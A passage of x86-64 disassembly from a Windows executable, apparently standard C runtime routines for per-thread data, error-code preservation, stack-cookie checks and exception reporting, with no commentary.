   140006adb:	74 17                	je     0x140006af4
   140006add:	48 8d 05 1c 2b 01 00 	lea    0x12b1c(%rip),%rax        # 0x140019600
   140006ae4:	48 3b c8             	cmp    %rax,%rcx
   140006ae7:	74 0b                	je     0x140006af4
   140006ae9:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   140006aed:	75 05                	jne    0x140006af4
   140006aef:	e8 84 29 00 00       	call   0x140009478
   140006af4:	48 89 9f 90 00 00 00 	mov    %rbx,0x90(%rdi)
   140006afb:	48 85 db             	test   %rbx,%rbx
   140006afe:	74 08                	je     0x140006b08
   140006b00:	48 8b cb             	mov    %rbx,%rcx
   140006b03:	e8 e4 28 00 00       	call   0x1400093ec
   140006b08:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006b0d:	48 83 c4 20          	add    $0x20,%rsp
   140006b11:	5f                   	pop    %rdi
   140006b12:	c3                   	ret
   140006b13:	cc                   	int3
   140006b14:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006b19:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006b1e:	57                   	push   %rdi
   140006b1f:	48 83 ec 20          	sub    $0x20,%rsp
   140006b23:	ff 15 67 85 00 00    	call   *0x8567(%rip)        # 0x14000f090
   140006b29:	8b 0d 81 25 01 00    	mov    0x12581(%rip),%ecx        # 0x1400190b0
   140006b2f:	33 f6                	xor    %esi,%esi
   140006b31:	8b d8                	mov    %eax,%ebx
   140006b33:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140006b36:	74 1d                	je     0x140006b55
   140006b38:	e8 e3 2e 00 00       	call   0x140009a20
   140006b3d:	48 8b f8             	mov    %rax,%rdi
   140006b40:	48 85 c0             	test   %rax,%rax
   140006b43:	74 0a                	je     0x140006b4f
   140006b45:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140006b49:	48 0f 44 fe          	cmove  %rsi,%rdi
   140006b4d:	eb 72                	jmp    0x140006bc1
   140006b4f:	8b 0d 5b 25 01 00    	mov    0x1255b(%rip),%ecx        # 0x1400190b0
   140006b55:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140006b59:	e8 ca 2e 00 00       	call   0x140009a28
   140006b5e:	85 c0                	test   %eax,%eax
   140006b60:	75 05                	jne    0x140006b67
   140006b62:	48 8b fe             	mov    %rsi,%rdi
   140006b65:	eb 5a                	jmp    0x140006bc1
   140006b67:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140006b6c:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006b71:	e8 fe 08 00 00       	call   0x140007474
   140006b76:	8b 0d 34 25 01 00    	mov    0x12534(%rip),%ecx        # 0x1400190b0
   140006b7c:	48 8b f8             	mov    %rax,%rdi
   140006b7f:	48 85 c0             	test   %rax,%rax
   140006b82:	75 10                	jne    0x140006b94
   140006b84:	33 d2                	xor    %edx,%edx
   140006b86:	e8 9d 2e 00 00       	call   0x140009a28
   140006b8b:	33 c9                	xor    %ecx,%ecx
   140006b8d:	e8 5a 09 00 00       	call   0x1400074ec
   140006b92:	eb ce                	jmp    0x140006b62
   140006b94:	48 8b d7             	mov    %rdi,%rdx
   140006b97:	e8 8c 2e 00 00       	call   0x140009a28
   140006b9c:	85 c0                	test   %eax,%eax
   140006b9e:	75 12                	jne    0x140006bb2
   140006ba0:	8b 0d 0a 25 01 00    	mov    0x1250a(%rip),%ecx        # 0x1400190b0
   140006ba6:	33 d2                	xor    %edx,%edx
   140006ba8:	e8 7b 2e 00 00       	call   0x140009a28
   140006bad:	48 8b cf             	mov    %rdi,%rcx
   140006bb0:	eb db                	jmp    0x140006b8d
   140006bb2:	48 8b cf             	mov    %rdi,%rcx
   140006bb5:	e8 0a fd ff ff       	call   0x1400068c4
   140006bba:	33 c9                	xor    %ecx,%ecx
   140006bbc:	e8 2b 09 00 00       	call   0x1400074ec
   140006bc1:	8b cb                	mov    %ebx,%ecx
   140006bc3:	ff 15 cf 84 00 00    	call   *0x84cf(%rip)        # 0x14000f098
   140006bc9:	48 85 ff             	test   %rdi,%rdi
   140006bcc:	74 13                	je     0x140006be1
   140006bce:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006bd3:	48 8b c7             	mov    %rdi,%rax
   140006bd6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006bdb:	48 83 c4 20          	add    $0x20,%rsp
   140006bdf:	5f                   	pop    %rdi
   140006be0:	c3                   	ret
   140006be1:	e8 a2 f9 ff ff       	call   0x140006588
   140006be6:	cc                   	int3
   140006be7:	cc                   	int3
   140006be8:	40 53                	rex push %rbx
   140006bea:	48 83 ec 20          	sub    $0x20,%rsp
   140006bee:	8b 0d bc 24 01 00    	mov    0x124bc(%rip),%ecx        # 0x1400190b0
   140006bf4:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140006bf7:	74 1b                	je     0x140006c14
   140006bf9:	e8 22 2e 00 00       	call   0x140009a20
   140006bfe:	48 8b d8             	mov    %rax,%rbx
   140006c01:	48 85 c0             	test   %rax,%rax
   140006c04:	74 08                	je     0x140006c0e
   140006c06:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140006c0a:	74 78                	je     0x140006c84
   140006c0c:	eb 6d                	jmp    0x140006c7b
   140006c0e:	8b 0d 9c 24 01 00    	mov    0x1249c(%rip),%ecx        # 0x1400190b0
   140006c14:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140006c18:	e8 0b 2e 00 00       	call   0x140009a28
   140006c1d:	85 c0                	test   %eax,%eax
   140006c1f:	74 63                	je     0x140006c84
   140006c21:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140006c26:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006c2b:	e8 44 08 00 00       	call   0x140007474
   140006c30:	8b 0d 7a 24 01 00    	mov    0x1247a(%rip),%ecx        # 0x1400190b0
   140006c36:	48 8b d8             	mov    %rax,%rbx
   140006c39:	48 85 c0             	test   %rax,%rax
   140006c3c:	75 10                	jne    0x140006c4e
   140006c3e:	33 d2                	xor    %edx,%edx
   140006c40:	e8 e3 2d 00 00       	call   0x140009a28
   140006c45:	33 c9                	xor    %ecx,%ecx
   140006c47:	e8 a0 08 00 00       	call   0x1400074ec
   140006c4c:	eb 36                	jmp    0x140006c84
   140006c4e:	48 8b d3             	mov    %rbx,%rdx
   140006c51:	e8 d2 2d 00 00       	call   0x140009a28
   140006c56:	85 c0                	test   %eax,%eax
   140006c58:	75 12                	jne    0x140006c6c
   140006c5a:	8b 0d 50 24 01 00    	mov    0x12450(%rip),%ecx        # 0x1400190b0
   140006c60:	33 d2                	xor    %edx,%edx
   140006c62:	e8 c1 2d 00 00       	call   0x140009a28
   140006c67:	48 8b cb             	mov    %rbx,%rcx
   140006c6a:	eb db                	jmp    0x140006c47
   140006c6c:	48 8b cb             	mov    %rbx,%rcx
   140006c6f:	e8 50 fc ff ff       	call   0x1400068c4
   140006c74:	33 c9                	xor    %ecx,%ecx
   140006c76:	e8 71 08 00 00       	call   0x1400074ec
   140006c7b:	48 8b c3             	mov    %rbx,%rax
   140006c7e:	48 83 c4 20          	add    $0x20,%rsp
   140006c82:	5b                   	pop    %rbx
   140006c83:	c3                   	ret
   140006c84:	e8 ff f8 ff ff       	call   0x140006588
   140006c89:	cc                   	int3
   140006c8a:	cc                   	int3
   140006c8b:	cc                   	int3
   140006c8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006c91:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006c96:	57                   	push   %rdi
   140006c97:	48 83 ec 20          	sub    $0x20,%rsp
   140006c9b:	ff 15 ef 83 00 00    	call   *0x83ef(%rip)        # 0x14000f090
   140006ca1:	8b 0d 09 24 01 00    	mov    0x12409(%rip),%ecx        # 0x1400190b0
   140006ca7:	33 f6                	xor    %esi,%esi
   140006ca9:	8b d8                	mov    %eax,%ebx
   140006cab:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140006cae:	74 1d                	je     0x140006ccd
   140006cb0:	e8 6b 2d 00 00       	call   0x140009a20
   140006cb5:	48 8b f8             	mov    %rax,%rdi
   140006cb8:	48 85 c0             	test   %rax,%rax
   140006cbb:	74 0a                	je     0x140006cc7
   140006cbd:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140006cc1:	48 0f 44 fe          	cmove  %rsi,%rdi
   140006cc5:	eb 72                	jmp    0x140006d39
   140006cc7:	8b 0d e3 23 01 00    	mov    0x123e3(%rip),%ecx        # 0x1400190b0
   140006ccd:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140006cd1:	e8 52 2d 00 00       	call   0x140009a28
   140006cd6:	85 c0                	test   %eax,%eax
   140006cd8:	75 05                	jne    0x140006cdf
   140006cda:	48 8b fe             	mov    %rsi,%rdi
   140006cdd:	eb 5a                	jmp    0x140006d39
   140006cdf:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140006ce4:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006ce9:	e8 86 07 00 00       	call   0x140007474
   140006cee:	8b 0d bc 23 01 00    	mov    0x123bc(%rip),%ecx        # 0x1400190b0
   140006cf4:	48 8b f8             	mov    %rax,%rdi
   140006cf7:	48 85 c0             	test   %rax,%rax
   140006cfa:	75 10                	jne    0x140006d0c
   140006cfc:	33 d2                	xor    %edx,%edx
   140006cfe:	e8 25 2d 00 00       	call   0x140009a28
   140006d03:	33 c9                	xor    %ecx,%ecx
   140006d05:	e8 e2 07 00 00       	call   0x1400074ec
   140006d0a:	eb ce                	jmp    0x140006cda
   140006d0c:	48 8b d7             	mov    %rdi,%rdx
   140006d0f:	e8 14 2d 00 00       	call   0x140009a28
   140006d14:	85 c0                	test   %eax,%eax
   140006d16:	75 12                	jne    0x140006d2a
   140006d18:	8b 0d 92 23 01 00    	mov    0x12392(%rip),%ecx        # 0x1400190b0
   140006d1e:	33 d2                	xor    %edx,%edx
   140006d20:	e8 03 2d 00 00       	call   0x140009a28
   140006d25:	48 8b cf             	mov    %rdi,%rcx
   140006d28:	eb db                	jmp    0x140006d05
   140006d2a:	48 8b cf             	mov    %rdi,%rcx
   140006d2d:	e8 92 fb ff ff       	call   0x1400068c4
   140006d32:	33 c9                	xor    %ecx,%ecx
   140006d34:	e8 b3 07 00 00       	call   0x1400074ec
   140006d39:	8b cb                	mov    %ebx,%ecx
   140006d3b:	ff 15 57 83 00 00    	call   *0x8357(%rip)        # 0x14000f098
   140006d41:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006d46:	48 8b c7             	mov    %rdi,%rax
   140006d49:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006d4e:	48 83 c4 20          	add    $0x20,%rsp
   140006d52:	5f                   	pop    %rdi
   140006d53:	c3                   	ret
   140006d54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006d59:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006d5e:	57                   	push   %rdi
   140006d5f:	48 83 ec 20          	sub    $0x20,%rsp
   140006d63:	8b 0d 47 23 01 00    	mov    0x12347(%rip),%ecx        # 0x1400190b0
   140006d69:	33 db                	xor    %ebx,%ebx
   140006d6b:	48 8b f2             	mov    %rdx,%rsi
   140006d6e:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140006d71:	74 1b                	je     0x140006d8e
   140006d73:	e8 a8 2c 00 00       	call   0x140009a20
   140006d78:	48 8b f8             	mov    %rax,%rdi
   140006d7b:	48 85 c0             	test   %rax,%rax
   140006d7e:	74 08                	je     0x140006d88
   140006d80:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140006d84:	74 79                	je     0x140006dff
   140006d86:	eb 6d                	jmp    0x140006df5
   140006d88:	8b 0d 22 23 01 00    	mov    0x12322(%rip),%ecx        # 0x1400190b0
   140006d8e:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140006d92:	e8 91 2c 00 00       	call   0x140009a28
   140006d97:	85 c0                	test   %eax,%eax
   140006d99:	74 64                	je     0x140006dff
   140006d9b:	ba c8 03 00 00       	mov    $0x3c8,%edx
   140006da0:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006da5:	e8 ca 06 00 00       	call   0x140007474
   140006daa:	8b 0d 00 23 01 00    	mov    0x12300(%rip),%ecx        # 0x1400190b0
   140006db0:	48 8b f8             	mov    %rax,%rdi
   140006db3:	48 85 c0             	test   %rax,%rax
   140006db6:	75 10                	jne    0x140006dc8
   140006db8:	33 d2                	xor    %edx,%edx
   140006dba:	e8 69 2c 00 00       	call   0x140009a28
   140006dbf:	33 c9                	xor    %ecx,%ecx
   140006dc1:	e8 26 07 00 00       	call   0x1400074ec
   140006dc6:	eb 37                	jmp    0x140006dff
   140006dc8:	48 8b d7             	mov    %rdi,%rdx
   140006dcb:	e8 58 2c 00 00       	call   0x140009a28
   140006dd0:	85 c0                	test   %eax,%eax
   140006dd2:	75 12                	jne    0x140006de6
   140006dd4:	8b 0d d6 22 01 00    	mov    0x122d6(%rip),%ecx        # 0x1400190b0
   140006dda:	33 d2                	xor    %edx,%edx
   140006ddc:	e8 47 2c 00 00       	call   0x140009a28
   140006de1:	48 8b cf             	mov    %rdi,%rcx
   140006de4:	eb db                	jmp    0x140006dc1
   140006de6:	48 8b cf             	mov    %rdi,%rcx
   140006de9:	e8 d6 fa ff ff       	call   0x1400068c4
   140006dee:	33 c9                	xor    %ecx,%ecx
   140006df0:	e8 f7 06 00 00       	call   0x1400074ec
   140006df5:	48 69 de c8 03 00 00 	imul   $0x3c8,%rsi,%rbx
   140006dfc:	48 03 df             	add    %rdi,%rbx
   140006dff:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006e04:	48 8b c3             	mov    %rbx,%rax
   140006e07:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006e0c:	48 83 c4 20          	add    $0x20,%rsp
   140006e10:	5f                   	pop    %rdi
   140006e11:	c3                   	ret
   140006e12:	cc                   	int3
   140006e13:	cc                   	int3
   140006e14:	48 83 ec 28          	sub    $0x28,%rsp
   140006e18:	48 8d 0d 75 fb ff ff 	lea    -0x48b(%rip),%rcx        # 0x140006994
   140006e1f:	e8 ec 2b 00 00       	call   0x140009a10
   140006e24:	89 05 86 22 01 00    	mov    %eax,0x12286(%rip)        # 0x1400190b0
   140006e2a:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006e2d:	75 04                	jne    0x140006e33
   140006e2f:	32 c0                	xor    %al,%al
   140006e31:	eb 15                	jmp    0x140006e48
   140006e33:	e8 54 fe ff ff       	call   0x140006c8c
   140006e38:	48 85 c0             	test   %rax,%rax
   140006e3b:	75 09                	jne    0x140006e46
   140006e3d:	33 c9                	xor    %ecx,%ecx
   140006e3f:	e8 0c 00 00 00       	call   0x140006e50
   140006e44:	eb e9                	jmp    0x140006e2f
   140006e46:	b0 01                	mov    $0x1,%al
   140006e48:	48 83 c4 28          	add    $0x28,%rsp
   140006e4c:	c3                   	ret
   140006e4d:	cc                   	int3
   140006e4e:	cc                   	int3
   140006e4f:	cc                   	int3
   140006e50:	48 83 ec 28          	sub    $0x28,%rsp
   140006e54:	8b 0d 56 22 01 00    	mov    0x12256(%rip),%ecx        # 0x1400190b0
   140006e5a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140006e5d:	74 0c                	je     0x140006e6b
   140006e5f:	e8 b4 2b 00 00       	call   0x140009a18
   140006e64:	83 0d 45 22 01 00 ff 	orl    $0xffffffff,0x12245(%rip)        # 0x1400190b0
   140006e6b:	b0 01                	mov    $0x1,%al
   140006e6d:	48 83 c4 28          	add    $0x28,%rsp
   140006e71:	c3                   	ret
   140006e72:	cc                   	int3
   140006e73:	cc                   	int3
   140006e74:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006e79:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006e7e:	57                   	push   %rdi
   140006e7f:	48 83 ec 20          	sub    $0x20,%rsp
   140006e83:	48 8b 31             	mov    (%rcx),%rsi
   140006e86:	33 ff                	xor    %edi,%edi
   140006e88:	48 8b d9             	mov    %rcx,%rbx
   140006e8b:	48 85 f6             	test   %rsi,%rsi
   140006e8e:	75 3b                	jne    0x140006ecb
   140006e90:	ff 15 fa 81 00 00    	call   *0x81fa(%rip)        # 0x14000f090
   140006e96:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140006e9a:	40 38 7b 10          	cmp    %dil,0x10(%rbx)
   140006e9e:	75 0a                	jne    0x140006eaa
   140006ea0:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   140006ea4:	c6 43 10 01          	movb   $0x1,0x10(%rbx)
   140006ea8:	eb 04                	jmp    0x140006eae
   140006eaa:	48 8b 7b 08          	mov    0x8(%rbx),%rdi
   140006eae:	48 8b d7             	mov    %rdi,%rdx
   140006eb1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140006eb6:	e8 99 fe ff ff       	call   0x140006d54
   140006ebb:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   140006ebf:	48 8b f0             	mov    %rax,%rsi
   140006ec2:	48 89 03             	mov    %rax,(%rbx)
   140006ec5:	ff 15 cd 81 00 00    	call   *0x81cd(%rip)        # 0x14000f098
   140006ecb:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006ed0:	48 8b c6             	mov    %rsi,%rax
   140006ed3:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006ed8:	48 83 c4 20          	add    $0x20,%rsp
   140006edc:	5f                   	pop    %rdi
   140006edd:	c3                   	ret
   140006ede:	cc                   	int3
   140006edf:	cc                   	int3
   140006ee0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006ee5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140006eea:	57                   	push   %rdi
   140006eeb:	48 83 ec 20          	sub    $0x20,%rsp
   140006eef:	33 db                	xor    %ebx,%ebx
   140006ef1:	48 8b fa             	mov    %rdx,%rdi
   140006ef4:	48 8b f1             	mov    %rcx,%rsi
   140006ef7:	38 5a 10             	cmp    %bl,0x10(%rdx)
   140006efa:	75 18                	jne    0x140006f14
   140006efc:	ff 15 8e 81 00 00    	call   *0x818e(%rip)        # 0x14000f090
   140006f02:	8b c8                	mov    %eax,%ecx
   140006f04:	48 89 5f 08          	mov    %rbx,0x8(%rdi)
   140006f08:	c6 47 10 01          	movb   $0x1,0x10(%rdi)
   140006f0c:	ff 15 86 81 00 00    	call   *0x8186(%rip)        # 0x14000f098
   140006f12:	eb 04                	jmp    0x140006f18
   140006f14:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   140006f18:	48 8d 04 de          	lea    (%rsi,%rbx,8),%rax
   140006f1c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006f21:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006f26:	48 83 c4 20          	add    $0x20,%rsp
   140006f2a:	5f                   	pop    %rdi
   140006f2b:	c3                   	ret
   140006f2c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006f31:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006f36:	55                   	push   %rbp
   140006f37:	57                   	push   %rdi
   140006f38:	41 56                	push   %r14
   140006f3a:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   140006f41:	ff 
   140006f42:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   140006f49:	48 8b 05 f0 20 01 00 	mov    0x120f0(%rip),%rax        # 0x140019040
   140006f50:	48 33 c4             	xor    %rsp,%rax
   140006f53:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   140006f5a:	41 8b f8             	mov    %r8d,%edi
   140006f5d:	8b f2                	mov    %edx,%esi
   140006f5f:	8b d9                	mov    %ecx,%ebx
   140006f61:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140006f64:	74 05                	je     0x140006f6b
   140006f66:	e8 6d a6 ff ff       	call   0x1400015d8
   140006f6b:	33 d2                	xor    %edx,%edx
   140006f6d:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140006f72:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140006f78:	e8 73 6e 00 00       	call   0x14000ddf0
   140006f7d:	33 d2                	xor    %edx,%edx
   140006f7f:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140006f83:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140006f89:	e8 62 6e 00 00       	call   0x14000ddf0
   140006f8e:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140006f93:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140006f98:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140006f9c:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140006fa0:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140006fa5:	ff 15 8d 80 00 00    	call   *0x808d(%rip)        # 0x14000f038
   140006fab:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   140006fb2:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140006fb7:	49 8b ce             	mov    %r14,%rcx
   140006fba:	45 33 c0             	xor    %r8d,%r8d
   140006fbd:	ff 15 7d 80 00 00    	call   *0x807d(%rip)        # 0x14000f040
   140006fc3:	48 85 c0             	test   %rax,%rax
   140006fc6:	74 36                	je     0x140006ffe
   140006fc8:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140006fce:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140006fd3:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140006fd8:	4c 8b c8             	mov    %rax,%r9
   140006fdb:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140006fe0:	4d 8b c6             	mov    %r14,%r8
   140006fe3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140006fe8:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140006fed:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140006ff1:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140006ff6:	33 c9                	xor    %ecx,%ecx
   140006ff8:	ff 15 4a 80 00 00    	call   *0x804a(%rip)        # 0x14000f048
   140006ffe:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140007005:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   14000700c:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   140007013:	48 83 c0 08          	add    $0x8,%rax
   140007017:	89 74 24 70          	mov    %esi,0x70(%rsp)
   14000701b:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140007022:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140007029:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   14000702d:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   140007031:	ff 15 19 80 00 00    	call   *0x8019(%rip)        # 0x14000f050
   140007037:	33 c9                	xor    %ecx,%ecx
   140007039:	8b f8                	mov    %eax,%edi
   14000703b:	ff 15 1f 80 00 00    	call   *0x801f(%rip)        # 0x14000f060
   140007041:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140007046:	ff 15 0c 80 00 00    	call   *0x800c(%rip)        # 0x14000f058
   14000704c:	85 c0                	test   %eax,%eax
   14000704e:	75 10                	jne    0x140007060
   140007050:	85 ff                	test   %edi,%edi
   140007052:	75 0c                	jne    0x140007060
   140007054:	83 fb ff             	cmp    $0xffffffff,%ebx
   140007057:	74 07                	je     0x140007060
   140007059:	8b cb                	mov    %ebx,%ecx
   14000705b:	e8 78 a5 ff ff       	call   0x1400015d8
   140007060:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   140007067:	48 33 cc             	xor    %rsp,%rcx
   14000706a:	e8 21 6a 00 00       	call   0x14000da90
   14000706f:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   140007076:	00 
   140007077:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   14000707b:	49 8b 73 30          	mov    0x30(%r11),%rsi
   14000707f:	49 8b e3             	mov    %r11,%rsp
   140007082:	41 5e                	pop    %r14
   140007084:	5f                   	pop    %rdi
   140007085:	5d                   	pop    %rbp
   140007086:	c3                   	ret
   140007087:	cc                   	int3
   140007088:	48 89 0d b1 2e 01 00 	mov    %rcx,0x12eb1(%rip)        # 0x140019f40
   14000708f:	c3                   	ret
   140007090:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007095:	55                   	push   %rbp
   140007096:	48 8b ec             	mov    %rsp,%rbp
   140007099:	48 83 ec 70          	sub    $0x70,%rsp
   14000709d:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   1400070a2:	83 3d 5b 2e 01 00 00 	cmpl   $0x0,0x12e5b(%rip)        # 0x140019f04
   1400070a9:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   1400070ad:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   1400070b1:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   1400070b5:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   1400070b9:	75 10                	jne    0x1400070cb
   1400070bb:	0f 10 05 96 26 01 00 	movups 0x12696(%rip),%xmm0        # 0x140019758
   1400070c2:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   1400070c6:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   1400070cb:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   1400070cf:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400070d4:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400070d8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400070dd:	e8 4a 00 00 00       	call   0x14000712c
   1400070e2:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   1400070e6:	75 0b                	jne    0x1400070f3
   1400070e8:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   1400070ec:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400070f3:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   1400070f7:	74 0f                	je     0x140007108
   1400070f9:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   1400070fc:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140007100:	e8 eb f4 ff ff       	call   0x1400065f0
   140007105:	89 58 20             	mov    %ebx,0x20(%rax)
   140007108:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000710c:	74 0f                	je     0x14000711d
   14000710e:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   140007111:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140007115:	e8 d6 f4 ff ff       	call   0x1400065f0
   14000711a:	89 58 24             	mov    %ebx,0x24(%rax)
   14000711d:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140007124:	00 
   140007125:	48 83 c4 70          	add    $0x70,%rsp
   140007129:	5d                   	pop    %rbp
   14000712a:	c3                   	ret
   14000712b:	cc                   	int3
   14000712c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007131:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007136:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000713b:	57                   	push   %rdi
   14000713c:	48 83 ec 30          	sub    $0x30,%rsp
   140007140:	48 8b e9             	mov    %rcx,%rbp
   140007143:	41 8b d9             	mov    %r9d,%ebx
   140007146:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000714b:	49 8b f8             	mov    %r8,%rdi
   14000714e:	48 8b f2             	mov    %rdx,%rsi
   140007151:	e8 1e fd ff ff       	call   0x140006e74
   140007156:	48 85 c0             	test   %rax,%rax
   140007159:	74 47                	je     0x1400071a2
   14000715b:	48 8b 80 b8 03 00 00 	mov    0x3b8(%rax),%rax
   140007162:	48 85 c0             	test   %rax,%rax
   140007165:	74 3b                	je     0x1400071a2
   140007167:	49 ba 70 2a 57 34 48 	movabs $0xd6bc1f4834572a70,%r10
   14000716e:	1f bc d6 
   140007171:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140007176:	48 8b d6             	mov    %rsi,%rdx
   140007179:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000717e:	4c 8b c7             	mov    %rdi,%r8
   140007181:	48 8b cd             	mov    %rbp,%rcx
   140007184:	44 8b cb             	mov    %ebx,%r9d
   140007187:	ff 15 db 80 00 00    	call   *0x80db(%rip)        # 0x14000f268
   14000718d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140007192:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140007197:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000719c:	48 83 c4 30          	add    $0x30,%rsp
   1400071a0:	5f                   	pop    %rdi
   1400071a1:	c3                   	ret
   1400071a2:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   1400071a7:	48 8d 0d 92 2d 01 00 	lea    0x12d92(%rip),%rcx        # 0x140019f40
   1400071ae:	e8 2d fd ff ff       	call   0x140006ee0
   1400071b3:	4c 8b 1d 86 1e 01 00 	mov    0x11e86(%rip),%r11        # 0x140019040
   1400071ba:	48 8b 08             	mov    (%rax),%rcx
   1400071bd:	41 8b c3             	mov    %r11d,%eax
   1400071c0:	4c 33 d9             	xor    %rcx,%r11
   1400071c3:	83 e0 3f             	and    $0x3f,%eax
   1400071c6:	8a c8                	mov    %al,%cl
   1400071c8:	49 d3 cb             	ror    %cl,%r11
   1400071cb:	4d 85 db             	test   %r11,%r11
   1400071ce:	74 0f                	je     0x1400071df
